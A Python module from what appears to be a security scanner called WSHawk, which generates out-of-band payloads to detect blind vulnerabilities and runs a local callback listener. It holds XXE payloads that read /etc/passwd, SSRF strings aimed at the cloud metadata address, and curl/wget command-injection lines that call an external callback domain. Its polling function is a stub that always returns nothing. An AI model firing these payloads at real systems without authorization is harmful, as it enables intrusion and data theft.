#!/usr/bin/env python3
"""
WSHawk OAST (Out-of-Band Application Security Testing) Module
Detects blind vulnerabilities using external callbacks
"""

import asyncio
import aiohttp
import hashlib
import time
import re
from typing import Dict, List, Optional, Tuple
from dataclasses import dataclass
import json

@dataclass
class OASTInteraction:
    """Represents an OAST interaction"""
    protocol: str  # dns, http, https
    full_id: str
    data: str
    timestamp: float

class OASTProvider:
    """
    OAST provider using interact.sh (or custom server)
    """
    
    def __init__(self, use_interactsh: bool = True, custom_server: Optional[str] = None):
        self.use_interactsh = use_interactsh
        self.custom_server = custom_server
        self.session_id = hashlib.md5(str(time.time()).encode()).hexdigest()[:12]
        self.domain = None
        self.interactions = []
        self.session = None
        
    async def start(self):
        """Initialize OAST session"""
        self.session = aiohttp.ClientSession()
        
        if self.use_interactsh:
            # Use interact.sh public server
            self.domain = f"{self.session_id}.oast.fun"
            # Note: interact.sh requires registration for polling
            # For now, we'll use a simpler approach
            print(f"[OAST] Using domain: {self.domain}")
        else:
            self.domain = self.custom_server
    
    async def stop(self):
        """Close OAST session"""
        if self.session:
            await self.session.close()
    
    def generate_payload(self, vuln_type: str, test_id: str) -> str:
        """
        Generate OAST payload for specific vulnerability type
        
        Args:
            vuln_type: xxe, ssrf, rce, etc.
            test_id: unique test identifier
        """
        unique_id = f"{vuln_type}-{test_id}-{self.session_id}"
        
        payloads = {
            'xxe': f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://{unique_id}.{self.domain}">]>
<root>&xxe;</root>''',
            
            'xxe_file': f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>''',
            
            'ssrf': f'http://{unique_id}.{self.domain}',
            
            'ssrf_internal': f'http://169.254.169.254/latest/meta-data/',
            
            'rce_curl': f'curl http://{unique_id}.{self.domain}',
            
            'rce_wget': f'wget http://{unique_id}.{self.domain}',
            
            'rce_ping': f'ping -c 1 {unique_id}.{self.domain}',
        }
        
        return payloads.get(vuln_type, f'http://{unique_id}.{self.domain}')
    
    async def check_interactions(self, test_id: str, timeout: int = 5) -> List[OASTInteraction]:
        """
        Check for OAST interactions
        
        Note: This is a simplified version. Real interact.sh requires API polling.
        For production, you'd need to:
        1. Register with interact.sh
        2. Poll their API
        3. Or run your own OAST server
        """
        # Wait for potential callback
        await asyncio.sleep(timeout)
        
        # In a real implementation, you would poll interact.sh API here
        # For now, we return empty (would need actual server integration)
        
        return self.interactions
    
    def has_interaction(self, test_id: str) -> bool:
        """Check if specific test received callback"""
        return any(test_id in interaction.full_id for interaction in self.interactions)


class SimpleOASTServer:
    """
    Simple local OAST server for testing
    Listens for HTTP callbacks
    """
    
    def __init__(self, port: int = 8888):
        self.port = port
        self.interactions = []
        self.server = None
        self.app = None
        
    async def start(self):
        """Start OAST callback server"""
        from aiohttp import web
        
        async def handle_callback(request):
            """Handle incoming OAST callback"""
            interaction = OASTInteraction(
                protocol='http',
                full_id=request.path,
                data=await request.text(),
                timestamp=time.time()
            )
            self.interactions.append(interaction)
            print(f"[OAST] Received callback: {request.path}")
            return web.Response(text="OK")
        
        self.app = web.Application()
        self.app.router.add_route('*', '/{tail:.*}', handle_callback)
        
        runner = web.AppRunner(self.app)
        await runner.setup()
        self.server = web.TCPSite(runner, 'localhost', self.port)
        await self.server.start()
        
        print(f"[OAST] Server listening on http://localhost:{self.port}")
    
    async def stop(self):
        """Stop OAST server"""
        if self.server:
            await self.server.stop()
    
    def get_interactions(self) -> List[OASTInteraction]:
        """Get all interactions"""
        return self.interactions
    
    def clear_interactions(self):
        """Clear interaction history"""
        self.interactions = []


# Test the OAST module
async def test_oast():
    """Test OAST functionality"""
    print("Testing OAST Module...")
    
    # Start local OAST server
    server = SimpleOASTServer(port=8888)
    await server.start()
    
    # Create OAST provider
    provider = OASTProvider(use_interactsh=False, custom_server="localhost:8888")
    await provider.start()
    
    # Generate payloads
    xxe_payload = provider.generate_payload('xxe', 'test1')
    ssrf_payload = provider.generate_payload('ssrf', 'test2')
    
    print(f"\n✓ XXE Payload generated: {xxe_payload[:80]}...")
    print(f"✓ SSRF Payload generated: {ssrf_payload}")
    
    # Simulate callback (in real scenario, vulnerable app would trigger this)
    async with aiohttp.ClientSession() as session:
        try:
            await session.get(f'http://localhost:8888/xxe-test1-callback')
        except:
            pass
    
    await asyncio.sleep(1)
    
    # Check interactions
    interactions = server.get_interactions()
    print(f"\n✓ Received {len(interactions)} interaction(s)")
    for interaction in interactions:
        print(f"  - {interaction.protocol}: {interaction.full_id}")
    
    # Cleanup
    await provider.stop()
    await server.stop()
    
    print("\nOAST Test complete!")

if __name__ == "__main__":
    asyncio.run(test_oast())
